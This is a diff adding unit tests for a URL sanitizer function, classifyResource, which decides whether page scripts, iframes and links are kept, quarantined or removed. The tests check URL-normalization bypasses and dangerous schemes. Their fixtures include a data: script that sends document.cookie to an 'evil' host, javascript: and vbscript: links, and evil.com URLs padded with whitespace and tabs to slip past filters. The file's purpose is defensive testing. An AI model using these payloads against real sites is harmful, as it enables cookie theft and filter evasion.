@@ -62,3 +62,84 @@ describe('classifyResource — белый список (default-deny)', () => {
     expect(classifyResource('https://d4tncaiqdi48w.cloudfront.net/app.js', 'script').action).toBe('quarantine');
   });
 });
+
+describe('classifyResource — нормализация URL (AL-2 / 2A-1)', () => {
+  // Браузер по URL-спецификации обрезает ведущие/хвостовые пробелы и вырезает
+  // внутренние \t\r\n из URL-атрибутов, после чего грузит хост. Чистильщик
+  // обязан видеть тот же URL, что увидит браузер.
+  it('ведущий пробел в src НЕ должен давать keep', () => {
+    const c = classifyResource('  https://evil.com/x.js', 'script');
+    expect(c.action).not.toBe('keep');
+    expect(c.action).toBe('quarantine');
+  });
+
+  it('ведущий таб в src НЕ должен давать keep', () => {
+    expect(classifyResource('\thttps://evil.com/p.png', 'img').action).not.toBe('keep');
+  });
+
+  it('внутренний перевод строки в схеме (https:/\\n/) НЕ должен давать keep', () => {
+    expect(classifyResource('https:/\n/evil.com/x.js', 'script').action).not.toBe('keep');
+  });
+
+  it('таб внутри схемы (ht\\ttps://) НЕ должен давать keep', () => {
+    expect(classifyResource('ht\ttps://evil.com/x.js', 'script').action).not.toBe('keep');
+  });
+
+  it('известный трекер с ведущим пробелом — всё равно remove', () => {
+    expect(classifyResource('  https://www.google-analytics.com/analytics.js', 'script').action).toBe('remove');
+  });
+
+  it('доверенный CDN с ведущим пробелом — всё равно keep', () => {
+    expect(
+      classifyResource('  https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/x.min.js', 'script').action,
+    ).toBe('keep');
+  });
+});
+
+describe('classifyResource — классификация схемы (AL-1 / 2A-2 / 2D-1)', () => {
+  it('data: в <script> → не keep (исполняемый чужой код)', () => {
+    expect(
+      classifyResource("data:text/javascript,fetch('//evil?'+document.cookie)", 'script').action,
+    ).toBe('quarantine');
+  });
+
+  it('data: в <iframe> → не keep (произвольный HTML/JS)', () => {
+    expect(classifyResource('data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+', 'iframe').action).toBe(
+      'quarantine',
+    );
+  });
+
+  it('blob: в <script> → не keep', () => {
+    expect(classifyResource('blob:https://evil.com/1234-uuid', 'script').action).toBe('quarantine');
+  });
+
+  it('filesystem: в <script> → не keep', () => {
+    expect(classifyResource('filesystem:https://evil.com/temporary/x.js', 'script').action).toBe('quarantine');
+  });
+
+  it('javascript: в href → remove', () => {
+    expect(classifyResource("javascript:location='//evil.com'", 'anchor').action).toBe('remove');
+  });
+
+  it('vbscript: в href → remove', () => {
+    expect(classifyResource('vbscript:msgbox(1)', 'anchor').action).toBe('remove');
+  });
+
+  it('регистр+пробел в схеме (  JavaScript:) не обходят классификацию', () => {
+    expect(classifyResource('  JavaScript:alert(1)', 'anchor').action).toBe('remove');
+  });
+
+  // ── Робастность: легитимные схемы НЕ должны блокироваться ──
+  it('РОБАСТНОСТЬ: data:image/png в <img> остаётся keep (inline-картинки часты)', () => {
+    expect(classifyResource('data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==', 'img').action).toBe('keep');
+  });
+
+  it('РОБАСТНОСТЬ: blob: в media остаётся keep (CSP media-src blob:)', () => {
+    expect(classifyResource('blob:https://site.example/abcd-uuid', 'media').action).toBe('keep');
+  });
+
+  it('РОБАСТНОСТЬ: mailto:/tel: остаются keep (легитимные не-http схемы)', () => {
+    expect(classifyResource('mailto:hi@example.com', 'anchor').action).toBe('keep');
+    expect(classifyResource('tel:+15551234567', 'anchor').action).toBe('keep');
+  });
+});
